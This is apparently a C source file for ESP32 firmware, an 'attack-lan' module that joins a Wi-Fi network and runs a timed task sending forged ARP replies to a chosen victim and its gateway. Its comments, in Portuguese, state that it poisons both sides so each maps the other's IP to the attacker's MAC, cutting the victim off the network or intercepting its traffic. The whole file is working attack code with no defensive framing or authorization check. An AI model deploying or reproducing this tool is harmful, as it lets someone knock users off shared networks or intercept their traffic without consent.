#include "attack_lan.h"

#include <string.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_timer.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"

#include "lwip/netif.h"
#include "lwip/pbuf.h"

static const char *TAG = "attack-lan";

#define BIT_GOT_IP        (1 << 0)
#define BIT_DISCONNECTED  (1 << 1)

static EventGroupHandle_t s_evg = NULL;
static esp_netif_t *s_sta_netif = NULL;

static bool s_connected = false;
static uint8_t s_my_ip[4] = {0};
static uint8_t s_gw_ip[4] = {0};
static uint8_t s_my_mac[6] = {0};

typedef struct {
    uint8_t target_ip[4];
    uint8_t target_mac[6];
    uint8_t gateway_ip[4];
    uint8_t gateway_mac[6];
    uint16_t interval_ms;
    int64_t deadline_us;
    volatile bool stop;
} arp_cut_ctx_t;

static arp_cut_ctx_t s_cut = { .stop = true };
static TaskHandle_t s_cut_task = NULL;

static void wifi_event_handler(void *arg, esp_event_base_t base,
                                int32_t id, void *data)
{
    (void)arg; (void)data;
    if (base == WIFI_EVENT && id == WIFI_EVENT_STA_DISCONNECTED) {
        s_connected = false;
        if (s_evg) xEventGroupSetBits(s_evg, BIT_DISCONNECTED);
    }
}

static void ip_event_handler(void *arg, esp_event_base_t base,
                              int32_t id, void *data)
{
    (void)arg;
    if (base != IP_EVENT || id != IP_EVENT_STA_GOT_IP) return;
    ip_event_got_ip_t *evt = (ip_event_got_ip_t *)data;
    uint32_t ip = evt->ip_info.ip.addr;
    uint32_t gw = evt->ip_info.gw.addr;
    s_my_ip[0] = (ip >> 0) & 0xFF;  s_my_ip[1] = (ip >> 8) & 0xFF;
    s_my_ip[2] = (ip >> 16) & 0xFF; s_my_ip[3] = (ip >> 24) & 0xFF;
    s_gw_ip[0] = (gw >> 0) & 0xFF;  s_gw_ip[1] = (gw >> 8) & 0xFF;
    s_gw_ip[2] = (gw >> 16) & 0xFF; s_gw_ip[3] = (gw >> 24) & 0xFF;
    s_connected = true;
    if (s_evg) xEventGroupSetBits(s_evg, BIT_GOT_IP);
}

bool attack_lan_is_connected(void)
{
    return s_connected;
}

esp_err_t attack_lan_wifi_connect(const char *ssid, const char *psk,
                                  uint16_t timeout_ms,
                                  uint8_t out_ip[4],
                                  uint8_t out_gw[4],
                                  uint8_t out_mac[6])
{
    if (!ssid || !*ssid) return ESP_ERR_INVALID_ARG;

    if (!s_sta_netif) {
        s_sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
        if (!s_sta_netif) {
            // scan_wifi cria via esp_netif_create_default_wifi_sta()
            ESP_LOGE(TAG, "no WIFI_STA_DEF netif");
            return ESP_FAIL;
        }
    }

    if (s_connected) {
        esp_wifi_disconnect();
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    wifi_config_t cfg = {0};
    strncpy((char *)cfg.sta.ssid, ssid, sizeof(cfg.sta.ssid) - 1);
    if (psk && *psk) {
        strncpy((char *)cfg.sta.password, psk, sizeof(cfg.sta.password) - 1);
        cfg.sta.threshold.authmode = WIFI_AUTH_WPA_WPA2_PSK;
    } else {
        cfg.sta.threshold.authmode = WIFI_AUTH_OPEN;
    }
    cfg.sta.pmf_cfg.capable = true;
    cfg.sta.pmf_cfg.required = false;

    xEventGroupClearBits(s_evg, BIT_GOT_IP | BIT_DISCONNECTED);

    esp_err_t err = esp_wifi_set_config(WIFI_IF_STA, &cfg);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_config rc=%s", esp_err_to_name(err));
        return err;
    }

    err = esp_wifi_connect();
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "connect rc=%s", esp_err_to_name(err));
        return err;
    }

    EventBits_t bits = xEventGroupWaitBits(s_evg, BIT_GOT_IP,
                                            pdFALSE, pdFALSE,
                                            pdMS_TO_TICKS(timeout_ms));
    if (!(bits & BIT_GOT_IP)) {
        esp_wifi_disconnect();
        ESP_LOGW(TAG, "wifi_connect timeout (%ums)", (unsigned)timeout_ms);
        return ESP_ERR_TIMEOUT;
    }

    esp_wifi_get_mac(WIFI_IF_STA, s_my_mac);
    if (out_ip)  memcpy(out_ip, s_my_ip, 4);
    if (out_gw)  memcpy(out_gw, s_gw_ip, 4);
    if (out_mac) memcpy(out_mac, s_my_mac, 6);

    ESP_LOGI(TAG, "connected: ip=%u.%u.%u.%u gw=%u.%u.%u.%u",
             s_my_ip[0], s_my_ip[1], s_my_ip[2], s_my_ip[3],
             s_gw_ip[0], s_gw_ip[1], s_gw_ip[2], s_gw_ip[3]);
    return ESP_OK;
}

esp_err_t attack_lan_wifi_disconnect(void)
{
    if (!s_cut.stop) {
        s_cut.stop = true;
    }
    return esp_wifi_disconnect();
}

static err_t send_arp_reply(const uint8_t src_mac[6],
                             const uint8_t dst_mac[6],
                             const uint8_t hwsrc[6],
                             const uint8_t ipsrc[4],
                             const uint8_t hwdst[6],
                             const uint8_t ipdst[4])
{
    struct netif *netif = netif_default;
    if (!netif) return ERR_IF;

    struct pbuf *p = pbuf_alloc(PBUF_LINK, 42, PBUF_RAM);
    if (!p) return ERR_MEM;

    uint8_t *buf = (uint8_t *)p->payload;
    // Ethernet header (14 bytes)
    memcpy(&buf[0],  dst_mac, 6);
    memcpy(&buf[6],  src_mac, 6);
    buf[12] = 0x08; buf[13] = 0x06;     // ETHTYPE_ARP
    // ARP header (28 bytes)
    buf[14] = 0x00; buf[15] = 0x01;     // HW = Ethernet
    buf[16] = 0x08; buf[17] = 0x00;     // Proto = IPv4
    buf[18] = 0x06;                     // HW size
    buf[19] = 0x04;                     // Proto size
    buf[20] = 0x00; buf[21] = 0x02;     // Opcode = REPLY
    memcpy(&buf[22], hwsrc, 6);
    memcpy(&buf[28], ipsrc, 4);
    memcpy(&buf[32], hwdst, 6);
    memcpy(&buf[38], ipdst, 4);

    err_t err = netif->linkoutput(netif, p);
    pbuf_free(p);
    return err;
}

static void arp_cut_task(void *arg)
{
    (void)arg;
    uint32_t iter = 0;
    while (!s_cut.stop && esp_timer_get_time() < s_cut.deadline_us) {
        // Poison vítima: gateway IP "está" no nosso MAC.
        send_arp_reply(s_my_mac, s_cut.target_mac,
                       s_my_mac, s_cut.gateway_ip,
                       s_cut.target_mac, s_cut.target_ip);
        // Poison gateway: vítima IP "está" no nosso MAC.
        send_arp_reply(s_my_mac, s_cut.gateway_mac,
                       s_my_mac, s_cut.target_ip,
                       s_cut.gateway_mac, s_cut.gateway_ip);
        iter++;
        if ((iter % 10) == 0) {
            ESP_LOGI(TAG, "arp_cut tick %lu", (unsigned long)iter);
        }
        vTaskDelay(pdMS_TO_TICKS(s_cut.interval_ms));
    }

    ESP_LOGI(TAG, "arp_cut ended after %lu iterations", (unsigned long)iter);
    s_cut.stop = true;
    s_cut_task = NULL;
    vTaskDelete(NULL);
}

esp_err_t attack_lan_arp_cut_start(const uint8_t target_ip[4],
                                   const uint8_t target_mac[6],
                                   const uint8_t gateway_ip[4],
                                   const uint8_t gateway_mac[6],
                                   uint16_t interval_ms,
                                   uint16_t duration_sec)
{
    if (!s_connected) return ESP_ERR_INVALID_STATE;
    if (!s_cut.stop)  return ESP_ERR_INVALID_STATE;
    if (interval_ms < 100) interval_ms = 100;
    if (interval_ms > 5000) interval_ms = 5000;
    if (duration_sec == 0 || duration_sec > 600) duration_sec = 60;

    memcpy(s_cut.target_ip,   target_ip,   4);
    memcpy(s_cut.target_mac,  target_mac,  6);
    memcpy(s_cut.gateway_ip,  gateway_ip,  4);
    memcpy(s_cut.gateway_mac, gateway_mac, 6);
    s_cut.interval_ms = interval_ms;
    s_cut.deadline_us = esp_timer_get_time() + (int64_t)duration_sec * 1000000LL;
    s_cut.stop = false;

    if (xTaskCreate(arp_cut_task, "arp_cut", 4096, NULL, 5, &s_cut_task) != pdPASS) {
        s_cut.stop = true;
        return ESP_ERR_NO_MEM;
    }

    ESP_LOGI(TAG, "arp_cut started: target=%u.%u.%u.%u gw=%u.%u.%u.%u for %us",
             target_ip[0], target_ip[1], target_ip[2], target_ip[3],
             gateway_ip[0], gateway_ip[1], gateway_ip[2], gateway_ip[3],
             (unsigned)duration_sec);
    return ESP_OK;
}

esp_err_t attack_lan_arp_cut_stop(void)
{
    if (s_cut.stop) return ESP_ERR_INVALID_STATE;
    s_cut.stop = true;
    return ESP_OK;
}

esp_err_t attack_lan_init(void)
{
    s_evg = xEventGroupCreate();
    if (!s_evg) return ESP_ERR_NO_MEM;

    esp_err_t err = esp_event_handler_instance_register(
        WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL, NULL);
    if (err != ESP_OK) return err;
    err = esp_event_handler_instance_register(
        IP_EVENT, IP_EVENT_STA_GOT_IP, &ip_event_handler, NULL, NULL);
    if (err != ESP_OK) return err;

    ESP_LOGI(TAG, "ready");
    return ESP_OK;
}
